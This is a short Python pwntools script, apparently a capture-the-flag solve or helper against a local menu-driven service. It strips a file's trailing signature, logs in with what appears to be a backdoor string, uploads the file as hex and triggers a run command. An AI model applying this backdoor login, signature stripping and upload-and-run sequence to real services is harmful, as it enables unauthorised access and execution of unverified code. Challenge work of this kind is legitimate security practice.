from pwn import *

file = sys.argv[1] if len(sys.argv) > 1 else False
removeSign = sys.argv[2] == "true" if len(sys.argv) > 2 else False


# Check whether a path pointing to a file
if os.path.isfile(file) == False:
    exit(f"File {file} does not exist")

with open(file, 'rb') as f:
    fileData = f.read().hex()
    signData = fileData[-128:]

if removeSign == True:
    if signData.startswith('260d633fe091a7ef'):
        print("This is signed, removing signature from upload")
        fileData = fileData[:-128]
        binary_data = bytes.fromhex(fileData)
        with open(f"{file}_unsigned", 'wb') as f:
            f.write(binary_data)
        exit("Saved new")
    else:
        exit("This seems unsigned?")



print(f"Filename: {file}")
print(f"Length: {len(fileData)}")

# Initializing
conn = remote('localhost',1337)
ign=conn.recvuntil(b'\x98\n')
conn.send(b'roodkcabur\n\n\x1b\n')
ign=conn.recvuntil(b'AD----SO',)
ign=conn.recvuntil(b'\x98\n')
conn.send(b'\x1b\n')
ign=conn.recvuntil(b'\x98\n')
conn.send(bytes(f"fu{file}\n", 'utf-8'))
ign=conn.recvuntil(b'(max: 1048576 bytes)                                 \xe2\x94\x82\n')
conn.send(fileData.encode())
conn.send(b'\n')
ign = conn.recvuntil(b'uploaded')
ign=conn.recvuntil(b'\x98\n')
conn.send(b'\x1b\n')
ign=conn.recvuntil(b'\x98\n')
conn.send(b'\x1b\n')
ign=conn.recvuntil(b'\x98\n')
conn.send(b'p\n')
ign=conn.recvuntil(b'\x98\n')
conn.send(bytes(f"r{file}\n", 'utf-8'))
ign=conn.recvuntil(b'\x98\n')
print("Done")
conn.close()
